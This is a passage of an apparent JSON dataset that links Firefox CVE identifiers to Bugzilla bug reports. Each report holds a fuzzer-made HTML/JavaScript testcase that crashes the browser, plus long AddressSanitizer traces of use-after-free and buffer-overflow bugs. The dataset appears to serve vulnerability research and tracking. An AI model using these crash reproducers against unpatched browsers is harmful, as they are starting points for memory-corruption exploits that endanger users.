nsCSSFrameConstructor::ContentRangeInserted(nsIContent*, nsIContent*, nsIContent*, nsILayoutHistoryState*, bool) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:7744:7 #23 0x7f1899ce88db in ContentInserted /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:7630:10 #24 0x7f1899ce88db in nsCSSFrameConstructor::RecreateFramesForContent(nsIContent*, bool, nsCSSFrameConstructor::RemoveFlags, nsIContent**) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:9699 #25 0x7f1899d069e6 in mozilla::RestyleManagerBase::ProcessRestyledFrames(nsStyleChangeList&) /home/worker/workspace/build/src/layout/base/RestyleManagerBase.cpp:1176:7 #26 0x7f1899d0d8f9 in ProcessOneRestyle /home/worker/workspace/build/src/layout/base/RestyleTracker.cpp:105:5 #27 0x7f1899d0d8f9 in mozilla::RestyleTracker::DoProcessRestyles() /home/worker/workspace/build/src/layout/base/RestyleTracker.cpp:266 #28 0x7f1899cef7c4 in ProcessRestyles /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RestyleManager.h:490:7 #29 0x7f1899cef7c4 in mozilla::RestyleManager::ProcessPendingRestyles() /home/worker/workspace/build/src/layout/base/RestyleManager.cpp:834 #30 0x7f1899f30f1e in ProcessPendingRestyles /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RestyleManagerHandleInlines.h:74:3 #31 0x7f1899f30f1e in PresShell::FlushPendingNotifications(mozilla::ChangesToFlush) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:4159 #32 0x7f1899c4321c in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1836:11 #33 0x7f1899c4fa61 in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:295:7 #34 0x7f1899c4f4f5 in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:316:5 #35 0x7f1899c5201e in applyImpl<mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver, void (mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::*)(mozilla::TimeStamp), StoreCopyPassByValue<mozilla::TimeStamp> , 0> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:775:12 #36 0x7f1899c5201e in apply<mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver, void (mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::*)(mozilla::TimeStamp)> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:781 #37 0x7f1899c5201e in mozilla::detail::RunnableMethodImpl<void (mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::*)(mozilla::TimeStamp), true, false, mozilla::TimeStamp>::Run() /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:810 #38 0x7f18931a38bb in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1216:7 #39 0x7f18932259fc in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/glue/nsThreadUtils.cpp:361:10 #40 0x7f1893fdd40f in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #41 0x7f1893f4efc8 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:232:3 #42 0x7f1893f4efc8 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:225 #43 0x7f1893f4efc8 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:205 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/dom/base/nsImageLoadingContent.cpp:155:24 in nsImageLoadingContent::Notify(imgIRequest*, int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) Shadow bytes around the buggy address: 0x0c0480082f00: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd 0x0c0480082f10: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd 0x0c0480082f20: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd 0x0c0480082f30: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd 0x0c0480082f40: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd =>0x0c0480082f50: fa fa fd fd fa fa fd[fd]fa fa fd fd fa fa fd fd 0x0c0480082f60: fa fa fd fa fa fa fd fa fa fa fd fd fa fa fd fd 0x0c0480082f70: fa fa fd fa fa fa fd fa fa fa fd fd fa fa fd fd 0x0c0480082f80: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd 0x0c0480082f90: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd 0x0c0480082fa0: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==2364==ABORTING"
      }
    ],
    "CVE-2017-7785": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1356985",
        "title": "heap-buffer-overflow in mozilla::a11y::DocAccessible::PutChildrenBack",
        "description": "The following testcase crashes the latest ASAN build of Firefox. crash.html: <script> function start() { try{fuzzPriv.enableAccessibility();}catch(e){ }; o5=document; o105=document.documentElement; document.documentElement.innerHTML=\"<figcaption id='id16'><style' id='id29'>\"; o252=document.createElement('audio'); o253=document.createElement('track'); o252.appendChild(o253); o5.write('<html><body><div>'); o256=o5.all[2]; o252.controls^=1; o5.documentElement.appendChild(o252); o5.defaultView.onerror=fun1; setTimeout(fun0, 4); } function fun0() { document.documentElement.style.transform='scale(0.1)'; o348=document.createElement('style'); o349=document.createTextNode(\"@import url('data:text/css,.class0{display:inline;mask-repeat:round;}')\"); o348.appendChild(o349); o350=document.createElement('iframe'); try{document.documentElement.animate([{background: '-moz-element(#id4)',},{}],100);}catch(e){} document.documentElement.appendChild(o105); document.documentElement.appendChild(o350); document.documentElement.appendChild(o348); o256.classList.toggle('class0'); } var c=0; function fun1() { if(c++!=1) return; o314=document.createElement(\"form\"); document.documentElement.appendChild(o314); o256.id='id14'; o350.setAttribute('aria-owns','id29 id36 id4 id4'); o314.setAttribute('aria-owns','id52 id14 id39 id47 id54 id16 id16 id29'); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==6299==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6020001ebe28 at pc 0x7f663ff03f2a bp 0x7ffe5e40bc50 sp 0x7ffe5e40bc48 READ of size 8 at 0x6020001ebe28 thread T0 (Web Content) #0 0x7f663ff03f29 in ~RefPtr /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:77:9 #1 0x7f663ff03f29 in Destruct /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:560 #2 0x7f663ff03f29 in DestructRange /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:2007 #3 0x7f663ff03f29 in RemoveElementsAt /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:2055 #4 0x7f663ff03f29 in mozilla::a11y::DocAccessible::PutChildrenBack(nsTArray<RefPtr<mozilla::a11y::Accessible> >*, unsigned int) /home/worker/workspace/build/src/accessible/generic/DocAccessible.cpp:2204 #5 0x7f663ff0492d in mozilla::a11y::DocAccessible::DoARIAOwnsRelocation(mozilla::a11y::Accessible*) /home/worker/workspace/build/src/accessible/generic/DocAccessible.cpp:2153:3 #6 0x7f663fe70b7c in mozilla::a11y::NotificationController::WillRefresh(mozilla::TimeStamp) /home/worker/workspace/build/src/accessible/base/NotificationController.cpp:805:18 #7 0x7f663d89051e in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1738:12 #8 0x7f663d89fa23 in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:299:7 #9 0x7f663d89f6f4 in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:321:5 #10 0x7f663d8a1d5b in RunRefreshDrivers /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:711:5 #11 0x7f663d8a1d5b in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::TickRefreshDriver(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:624 #12 0x7f663d8a1a59 in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::NotifyVsync(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:525:9 #13 0x7f663e0ebc64 in mozilla::layout::VsyncChild::RecvNotify(mozilla::TimeStamp const&) /home/worker/workspace/build/src/layout/ipc/VsyncChild.cpp:64:16 #14 0x7f6638378647 in mozilla::layout::PVsyncChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PVsyncChild.cpp:155:20 #15 0x7f6638036d46 in mozilla::ipc::PBackgroundChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundChild.cpp:1512:28 #16 0x7f6637f96880 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1872:25 #17 0x7f6637f930c7 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1807:17 #18 0x7f6637f954f4 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1680:5 #19 0x7f6637f95af6 in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1713:15 #20 0x7f66371e3b90 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1269:14 #21 0x7f66371e05d8 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #22 0x7f6637f9de01 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #23 0x7f6637efffe0 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #24 0x7f6637efffe0 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #25 0x7f6637efffe0 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #26 0x7f663d2125ff in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27 #27 0x7f6640816a17 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:875:22 #28 0x7f6637efffe0 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #29 0x7f6637efffe0 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #30 0x7f6637efffe0 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #31 0x7f664081640f in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:699:34 #32 0x4eb5c3 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:30 #33 0x4eb5c3 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:286 #34 0x7f665290382f in __libc_start_main /build/glibc-9tT8Do/glibc-2.23/csu/../csu/libc-start.c:291 #35 0x41cf18 in _start (/home/nils/fuzzer3/firefox/firefox+0x41cf18) 0x6020001ebe28 is located 8 bytes to the left of 16-byte region [0x6020001ebe30,0x6020001ebe40) allocated by thread T0 (Web Content) here: #0 0x4bb79c in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64:3 #1 0x7f663703f450 in Alloc /home/worker/workspace/build/src/xpcom/string/nsSubstring.cpp:242:22 #2 0x7f663703f450 in nsAString::MutatePrep(unsigned int, char16_t**, unsigned int*) /home/worker/workspace/build/src/xpcom/string/nsTSubstring.cpp:155 #3 0x7f6637046fb5 in nsAString::ReplacePrepInternal(unsigned int, unsigned int, unsigned int, unsigned int) /home/worker/workspace/build/src/xpcom/string/nsTSubstring.cpp:217:8 #4 0x7f6637046e05 in nsAString::ReplacePrep(unsigned int, unsigned int, unsigned int) /home/worker/workspace/build/src/xpcom/string/nsTSubstring.cpp:207:10 #5 0x7f663704977e in nsAString::Replace(unsigned int, unsigned int, char16_t) /home/worker/workspace/build/src/xpcom/string/nsTSubstring.cpp:534:7 #6 0x7f663fe6007d in mozilla::a11y::NotificationController::QueueMutationEvent(mozilla::a11y::AccTreeMutationEvent*) /home/worker/workspace/build/src/accessible/base/NotificationController.cpp:205:28 #7 0x7f663fee54ef in mozilla::a11y::Accessible::MoveChild(unsigned int, mozilla::a11y::Accessible*) /home/worker/workspace/build/src/accessible/generic/Accessible.cpp:2208:47 #8 0x7f663ff05494 in mozilla::a11y::DocAccessible::MoveChild(mozilla::a11y::Accessible*, mozilla::a11y::Accessible*, int) /home/worker/workspace/build/src/accessible/generic/DocAccessible.cpp:2232:16 #9 0x7f663ff0479d in mozilla::a11y::DocAccessible::DoARIAOwnsRelocation(mozilla::a11y::Accessible*) /home/worker/workspace/build/src/accessible/generic/DocAccessible.cpp:2144:9 #10 0x7f663fe70b7c in mozilla::a11y::NotificationController::WillRefresh(mozilla::TimeStamp) /home/worker/workspace/build/src/accessible/base/NotificationController.cpp:805:18 #11 0x7f663d89051e in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1738:12 #12 0x7f663d89fa23 in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:299:7 #13 0x7f663d89f6f4 in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:321:5 #14 0x7f663d8a1d5b in RunRefreshDrivers /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:711:5 #15 0x7f663d8a1d5b in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::TickRefreshDriver(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:624 #16 0x7f663d8a1a59 in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::NotifyVsync(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:525:9 #17 0x7f663e0ebc64 in mozilla::layout::VsyncChild::RecvNotify(mozilla::TimeStamp const&) /home/worker/workspace/build/src/layout/ipc/VsyncChild.cpp:64:16 #18 0x7f6638378647 in mozilla::layout::PVsyncChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PVsyncChild.cpp:155:20 #19 0x7f6638036d46 in mozilla::ipc::PBackgroundChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundChild.cpp:1512:28 #20 0x7f6637f96880 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1872:25 #21 0x7f6637f930c7 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1807:17 #22 0x7f6637f954f4 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1680:5 #23 0x7f6637f95af6 in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1713:15 #24 0x7f66371e3b90 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1269:14 #25 0x7f66371e05d8 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #26 0x7f6637f9de01 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #27 0x7f6637efffe0 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #28 0x7f6637efffe0 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #29 0x7f6637efffe0 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #30 0x7f663d2125ff in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27 #31 0x7f6640816a17 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:875:22 #32 0x7f6637efffe0 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #33 0x7f6637efffe0 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #34 0x7f6637efffe0 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #35 0x7f664081640f in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:699:34 SUMMARY: AddressSanitizer: heap-buffer-overflow /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:77:9 in ~RefPtr Shadow bytes around the buggy address: 0x0c0480035770: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c0480035780: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c0480035790: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c04800357a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c04800357b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c04800357c0: fa fa 00 00 fa[fa]00 00 fa fa 00 00 fa fa 00 00 0x0c04800357d0: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00 0x0c04800357e0: fa fa 00 00 fa fa fd fd fa fa 00 00 fa fa 00 00 0x0c04800357f0: fa fa 00 00 fa fa fd fd fa fa fd fd fa fa fd fd 0x0c0480035800: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd 0x0c0480035810: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==6299==ABORTING"
      }
    ],
    "CVE-2017-7786": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1365189",
        "title": "type confusion in mozilla::SVGGeometryFrame::GetCanvasTM",
        "description": "The following testcase crashes the latest ASAN build of Firefox. <script> function start() { o0=document.createElement('iframe'); o0.src=\"data:text/html,<html><svg xmlns='http://www.w3.org/2000/svg'></svg></html>\"; o0.addEventListener('load', fun0,false); document.body.appendChild(o0); o3=document; } function fun0() { o6=o0.contentDocument; o7=o6.getElementsByTagName('*')[3]; o316=document.documentElement; o3.designMode='on'; document.replaceChild(o6.documentElement,window.top.document.documentElement); o1024=document.createElementNS('http://www.w3.org/2000/svg','filter'); o1024.setAttribute('id','id0'); o1031=document.createElementNS('http://www.w3.org/2000/svg','feMerge'); o1039=document.createElementNS('http://www.w3.org/2000/svg','feMergeNode'); o1031.appendChild(o1039); o1024.appendChild(o1031); o7.appendChild(o1024); o1039.style.filter='url(#id0)'; o316.style.filter='url(#id7)'; o1039.id='id20'; o610=document.createElement('style'); o611=document.createTextNode(\"*{ background: -moz-element(#id20);\"); o610.appendChild(o611); document.documentElement.appendChild(o610); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==28350==ERROR: AddressSanitizer: global-buffer-overflow on address 0x7fd26840d038 at pc 0x7fd2615b5745 bp 0x7fff4bdc59b0 sp 0x7fff4bdc59a8 READ of size 8 at 0x7fd26840d038 thread T0 (Web Content) #0 0x7fd2615b5744 in mozilla::SVGGeometryFrame::GetCanvasTM() /home/worker/workspace/build/src/layout/svg/SVGGeometryFrame.cpp:701:52 #1 0x7fd2616446ac in nsSVGUtils::GetCanvasTM(nsIFrame*) /home/worker/workspace/build/src/layout/svg/nsSVGUtils.cpp:428:50 #2 0x7fd2615eb37f in nsFilterInstance::GetPreFilterNeededArea(nsIFrame*, nsRegion const&) /home/worker/workspace/build/src/layout/svg/nsFilterInstance.cpp:114:18 #3 0x7fd2616225ae in nsSVGIntegrationUtils::GetRequiredSourceForInvalidArea(nsIFrame*, nsRect const&) /home/worker/workspace/build/src/layout/svg/nsSVGIntegrationUtils.cpp:354:10 #4 0x7fd2612926cb in nsIFrame::BuildDisplayListForStackingContext(nsDisplayListBuilder*, nsRect const&, nsDisplayList*) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2448:7 #5 0x7fd26110ba2c in nsLayoutUtils::PaintFrame(nsRenderingContext*, nsIFrame*, nsRegion const&, unsigned int, nsDisplayListBuilderMode, nsLayoutUtils::PaintFrameFlags) /home/worker/workspace/build/src/layout/base/nsLayoutUtils.cpp:3598:15 #6 0x7fd26162a025 in PaintFrameCallback::operator()(gfxContext*, gfxRect const&, mozilla::gfx::SamplingFilter, gfxMatrix const&) /home/worker/workspace/build/src/layout/svg/nsSVGIntegrationUtils.cpp:1200:3 #7 0x7fd25ca35358 in gfxCallbackDrawable::Draw(gfxContext*, gfxRect const&, mozilla::gfx::ExtendMode, mozilla::gfx::SamplingFilter, double, gfxMatrix const&) /home/worker/workspace/build/src/gfx/thebes/gfxDrawable.cpp:172:16 #8 0x7fd25ca34c26 in gfxCallbackDrawable::MakeSurfaceDrawable(mozilla::gfx::SamplingFilter) /home/worker/workspace/build/src/gfx/thebes/gfxDrawable.cpp:129:5 #9 0x7fd25ca351a5 in gfxCallbackDrawable::Draw(gfxContext*, gfxRect const&, mozilla::gfx::ExtendMode, mozilla::gfx::SamplingFilter, double, gfxMatrix const&) /home/worker/workspace/build/src/gfx/thebes/gfxDrawable.cpp:163:28 #10 0x7fd25cbae754 in gfxUtils::DrawPixelSnapped(gfxContext*, gfxDrawable*, gfxSize const&, mozilla::image::ImageRegion const&, mozilla::gfx::SurfaceFormat, mozilla::gfx::SamplingFilter, unsigned int, double) /home/worker/workspace/build/src/gfx/thebes/gfxUtils.cpp:584:15 #11 0x7fd25cc30e40 in mozilla::image::DynamicImage::Draw(gfxContext*, mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits> const&, mozilla::image::ImageRegion const&, unsigned int, mozilla::gfx::SamplingFilter, mozilla::Maybe<mozilla::SVGImageContext> const&, unsigned int, float) /home/worker/workspace/build/src/image/DynamicImage.cpp:238:5 #12 0x7fd2611226da in DrawImageInternal(gfxContext&, nsPresContext*, imgIContainer*, mozilla::gfx::SamplingFilter, nsRect const&, nsRect const&, nsPoint const&, nsRect const&, mozilla::Maybe<mozilla::SVGImageContext> const&, unsigned int, mozilla::gfx::ExtendMode, float) /home/worker/workspace/build/src/layout/base/nsLayoutUtils.cpp:6692:22 #13 0x7fd26112685b in nsLayoutUtils::DrawImage(gfxContext&, nsPresContext*, imgIContainer*, mozilla::gfx::SamplingFilter, nsRect const&, nsRect const&, nsPoint const&, nsRect const&, unsigned int, float) /home/worker/workspace/build/src/layout/base/nsLayoutUtils.cpp:6925:10 #14 0x7fd261971480 in mozilla::nsImageRenderer::Draw(nsPresContext*, nsRenderingContext&, nsRect const&, nsRect const&, nsRect const&, nsPoint const&, nsSize const&, mozilla::gfx::IntRectTyped<mozilla::CSSPixel> const&, float) /home/worker/workspace/build/src/layout/painting/nsImageRenderer.cpp:544:9 #15 0x7fd2618c158b in mozilla::nsImageRenderer::DrawLayer(nsPresContext*, nsRenderingContext&, nsRect const&, nsRect const&, nsPoint const&, nsRect const&, nsSize const&, float) /home/worker/workspace/build/src/layout/painting/nsImageRenderer.cpp:706:10 #16 0x7fd2618b927d in nsCSSRendering::PaintStyleImageLayerWithSC(nsCSSRendering::PaintBGParams const&, nsRenderingContext&, nsStyleContext*, nsStyleBorder const&) /home/worker/workspace/build/src/layout/painting/nsCSSRendering.cpp:2721:30 #17 0x7fd2618b72e9 in nsCSSRendering::PaintStyleImageLayer(nsCSSRendering::PaintBGParams const&, nsRenderingContext&) /home/worker/workspace/build/src/layout/painting/nsCSSRendering.cpp:1943:10 #18 0x7fd261927229 in nsDisplayBackgroundImage::PaintInternal(nsDisplayListBuilder*, nsRenderingContext*, nsRect const&, nsRect*) /home/worker/workspace/build/src/layout/painting/nsDisplayList.cpp:3689:5 #19 0x7fd26123d158 in nsDisplayCanvasBackgroundImage::Paint(nsDisplayListBuilder*, nsRenderingContext*) /home/worker/workspace/build/src/layout/generic/nsCanvasFrame.cpp:390:3 #20 0x7fd26189a639 in mozilla::FrameLayerBuilder::PaintItems(nsTArray<mozilla::FrameLayerBuilder::ClippedDisplayItem>&, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, gfxContext*, nsRenderingContext*, nsDisplayListBuilder*, nsPresContext*, mozilla::gfx::IntPointTyped<mozilla::gfx::UnknownUnits> const&, float, float, int) /home/worker/workspace/build/src/layout/painting/FrameLayerBuilder.cpp:6036:21 #21 0x7fd26189d114 in mozilla::FrameLayerBuilder::DrawPaintedLayer(mozilla::layers::PaintedLayer*, gfxContext*, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, mozilla::layers::DrawRegionClip, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, void*) /home/worker/workspace/build/src/layout/painting/FrameLayerBuilder.cpp:6211:19 #22 0x7fd25c8199da in mozilla::layers::ClientPaintedLayer::PaintThebes(nsTArray<mozilla::layers::ReadbackProcessor::Update>*) /home/worker/workspace/build/src/gfx/layers/client/ClientPaintedLayer.cpp:86:5 #23 0x7fd25c81a656 in mozilla::layers::ClientPaintedLayer::RenderLayerWithReadback(mozilla::layers::ReadbackProcessor*) /home/worker/workspace/build/src/gfx/layers/client/ClientPaintedLayer.cpp:140:3 #24 0x7fd25c84b66f in mozilla::layers::ClientContainerLayer::RenderLayer() /home/worker/workspace/build/src/gfx/layers/client/ClientContainerLayer.h:57:29 #25 0x7fd25c815096 in mozilla::layers::ClientLayerManager::EndTransactionInternal(void (*)(mozilla::layers::PaintedLayer*, gfxContext*, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, mozilla::layers::DrawRegionClip, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, void*), void*, mozilla::layers::LayerManager::EndTransactionFlags) /home/worker/workspace/build/src/gfx/layers/client/ClientLayerManager.cpp:375:13 #26 0x7fd25c815907 in mozilla::layers::ClientLayerManager::EndTransaction(void (*)(mozilla::layers::PaintedLayer*, gfxContext*, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, mozilla::layers::DrawRegionClip, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, void*), void*, mozilla::layers::LayerManager::EndTransactionFlags) /home/worker/workspace/build/src/gfx/layers/client/ClientLayerManager.cpp:433:3 #27 0x7fd261910f47 in nsDisplayList::PaintRoot(nsDisplayListBuilder*, nsRenderingContext*, unsigned int) /home/worker/workspace/build/src/layout/painting/nsDisplayList.cpp:2292:17 #28 0x7fd26110ca1e in nsLayoutUtils::PaintFrame(nsRenderingContext*, nsIFrame*, nsRegion const&, unsigned int, nsDisplayListBuilderMode, nsLayoutUtils::PaintFrameFlags) /home/worker/workspace/build/src/layout/base/nsLayoutUtils.cpp:3721:12 #29 0x7fd2610127f6 in mozilla::PresShell::Paint(nsView*, nsRegion const&, unsigned int) /home/worker/workspace/build/src/layout/base/PresShell.cpp:6498:5 #30 0x7fd2608729b2 in nsViewManager::ProcessPendingUpdatesPaint(nsIWidget*) /home/worker/workspace/build/src/view/nsViewManager.cpp:481:19 #31 0x7fd260871915 in 